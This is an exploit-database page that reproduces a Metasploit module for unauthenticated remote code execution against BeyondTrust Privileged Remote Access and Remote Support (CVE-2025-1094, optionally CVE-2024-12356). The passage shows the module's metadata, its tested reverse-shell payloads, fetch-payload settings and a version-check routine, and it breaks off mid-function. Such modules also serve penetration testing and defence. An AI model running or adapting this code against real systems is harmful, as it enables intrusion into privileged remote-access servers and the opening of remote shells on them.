---
title: BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025020010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-02-20
fetch_date: 2025-10-06T20:32:53.378952
---

# BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution** **2025.02.19**  Credit:  **[sfewer](https://cxsecurity.com/author/sfewer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-1094](https://cxsecurity.com/cveshow/CVE-2025-1094/ "Click to see CVE-2025-1094")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Rex::Proto::Http::WebSocket
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution',
'Description' => %q{
This exploit achieves unauthenticated remote code execution against BeyondTrust Privileged Remote
Access (PRA) and Remote Support (RS), with the privileges of the site user of the targeted BeyondTrust
product site. This exploit targets PRA and RS versions 24.3.1 and below.
},
'License' => MSF\_LICENSE,
'Author' => [
'sfewer-r7' # Rapid7 Analysis and Metasploit module
],
'References' => [
['CVE', '2024-12356'], # The argument injection in BeyondTrust code. By default, this exploit does not leverage CVE-2024-12356.
['CVE', '2025-1094'], # The SQL injection in PostgreSQL code.
['URL', 'https://www.beyondtrust.com/trust-center/security-advisories/bt24-10'], # BeyondTrust Advisory
['URL', 'https://www.postgresql.org/support/security/CVE-2025-1094/'], # PostgreSQL Advisory
['URL', 'https://attackerkb.com/topics/G5s8ZWAbYH/cve-2024-12356/rapid7-analysis'] # Rapid7 Analysis
],
'DisclosureDate' => '2024-12-16',
'Platform' => [ 'linux', 'unix' ],
'Arch' => [ARCH\_CMD],
'Privileged' => false, # Executes as the site user.
'Targets' => [
[
'Default', {
'Payload' => {
'DisableNops' => true,
# Our payload is passed to the PHP function pg\_escape\_string. We want to avoid any single quotes
# getting escaped unexpectedly. The server may be configured to escape double quotes (not by default).
# We also want to avoid any backward slash characters if CVE-2024-12356 is being leveraged.
'BadChars' => '\'"\\'
}
}
]
],
# NOTE: Tested with the following payloads:
# cmd/linux/http/x64/meterpreter/reverse\_tcp
# cmd/unix/reverse\_bash
# cmd/unix/generic
'DefaultOptions' => {
'RPORT' => 443,
'SSL' => true,
# A writable directory on the target for fetch based payloads to write to.
'FETCH\_WRITABLE\_DIR' => '/var/tmp',
# Delete the fetch binary after execution.
'FETCH\_DELETE' => true,
# By default, a deployed site, like Remote Support, is expected to be located at the root path.
'URIPATH' => '/'
},
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS]
}
)
)
register\_advanced\_options(
[
OptString.new('TargetCompanyName', [false, 'If set, use this name value to identify the company name of the deployed site. By default, this is auto discovered.']),
OptString.new('TargetServerFQDN', [false, 'If set, use this FQDN value to identify the FQDN of the deployed site. By default, this is auto discovered.']),
OptBool.new('LeverageCVE\_2024\_12356', [false, 'By default, this exploit does not leverage CVE-2024-12356. Enabling this option will cause this exploit to leverage CVE-2024-12356.', false])
]
)
end
def check
res = send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'get\_rdf'),
'vars\_get' => {
'comp' => 'sdcust',
'locale\_code' => 'en-us'
}
)
return CheckCode::Unknown('Connection failed') unless res
return CheckCode::Unknown("Unexpected response code #{res.code}") unless res.code == 200
# The HTTP content data will have something like this, followed by ~800Kb of string data:
# 00000000 30 20 53 75 63 63 65 73 73 66 75 6c 0a 65 6e 2d |0 Successful.en-|
# 00000010 75 73 0a 31 37 33 37 33 36 38 38 37 32 0a 42 52 |us.1737368872.BR|
# 00000020 44 46 80 00 0a 91 07 81 32 34 2e 31 2e 32 00 82 |DF......24.1.2..|
# 00000030 00 00 00 00 67 8e 25 28 91 06 83 65 6e 2d 75 73 |....g.%(...en-us|
# First there is a "0 Successful\nLOCALE\_ID\nTIMESTAMP\n" value, we use a regex to match this so we can ignore it.
header = res.body.match(/^(0 Successful\n.+\n\d+\n)/)
return CheckCode::Unknown('Unexpected response header') unless header
# Extract the remainder of the data, after the "0 Successful\nLOCALE\_ID\nTIMESTAMP\n" pre-amble.
brdf\_data = res.body[header[1].length..]
return CheckCode::Unknown('Unexpected response data') unless brdf\_data.include? 'Thank you for using BeyondTrust'
# Pull out the magic value (4 bytes), the first tag and its value (file version, 3 bytes), and then the second tag
# and its value (product version). The product version is encoded as a string, so has two tags, one for the
# string type (0x91) and the other for the tag type (0x81).
magic, \_, \_, prod\_version\_tag1, file\_version\_data\_len, file\_version\_tag2 = brdf\_data.unpack('NCvCCC')
# Inspect the data to ensure it looks like what we expect.
return CheckCode::Unknown('Unexpected header magic') unless magic == 0x42524446 # BRDF
return CheckCode::Unknown('Unexpected header prod\_version\_tag1') unless prod\_version\_tag1 == 0x91 # RDF\_SMALL\_SIZE
return CheckCode::Unknown('Unexpected header file\_version\_tag2') unless file\_version\_tag2 == 0x81 # RDF\_PRODUCT\_VERSION
product\_version = brdf\_data[10, file\_version\_data\_len - 1]
# We cannot differentiate between the two affected products, Privileged Remote Access (PRA) and Remote Support (RS).
# However, they both share a common version number, and a common patch for this vulnerability.
#
# Note #1: The vendor advisory only states that versions "24.3.1 and earlier" are affected, so we do not have a lower
# bound version number to test against.
#
# Note #2: The vendor supplied a patch (BT24-10-ONPREM1 or BT24-10-ONPREM2) to remediate the issue, in lieu of an
# updated product release. This patch does not change the prod...